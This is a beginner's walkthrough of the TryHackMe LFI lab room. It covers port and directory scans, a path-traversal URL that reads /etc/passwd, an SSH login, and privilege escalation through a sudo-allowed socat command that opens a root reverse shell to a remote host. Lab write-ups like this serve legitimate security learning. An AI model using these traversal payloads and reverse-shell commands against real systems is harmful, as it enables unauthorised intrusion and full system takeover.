This is a write up for the beginner level room LFI on tryhackme.com

This room is designed for people to get familiar with local file inclusion

There are two flags we need to get the user flag and the root flag. Pretty normal stuff

Going with a normal nmap scan to start things of

nmap -sS -sV -A 10.10.135.17

We see two open port. We've got the ssh port open on 22 as expected and http on 80.
The interesting thing from a glance is the blog available on the http port so let's go check it out.

We are presented with a blog about hacking, LFI and RFI

A quick skim through the code shows some comments but nothing super easy like credentials. I also see a search bar which could be usefull but first I'm going to run a GoBuster scan to see what we have going on.

gobuster dir -u http://10.10.135.17 -w /usr/share/wordlists/dirb/common.txt

While running the gobuster scan I read the articles on the blog which explained how we are going to get access to the machine.

and Gobuster showed us nothing usefull. Normally I would check for other folders using dirb or other tools but this is a beginner room LFI room so that is obviously the way forward.

Running a quick check for LFI i changed url to:
	http://10.10.135.17/article?name=../../../etc/passwd

This presents us with the passwd file and we can use ssh on a username:password we find in the file.

ssh user@IP
password

ls 
cat user.txt

and the first flag is right there. So far so good.

Now we're in as a user but we need to get to the root flag. So it's time for sudo -l

Matching Defaults entries for falconfeast on inclusion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User falconfeast may run the following commands on inclusion:
    (root) NOPASSWD: /usr/bin/*****

And look ***** needs no password to runs as root so  lets go check out gtfobins for ennumeration

We go to the gtfo page for ***** and it shows us how to create a reverse shell.

If you're new like me you'll use the wrong command a few times, but here's the command to run on the ssh

sudo /usr/bin/socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane

look around go find the root flag. It's in the same place it always is /root/root.txt

I hope you enjoyed this quick and easy room.
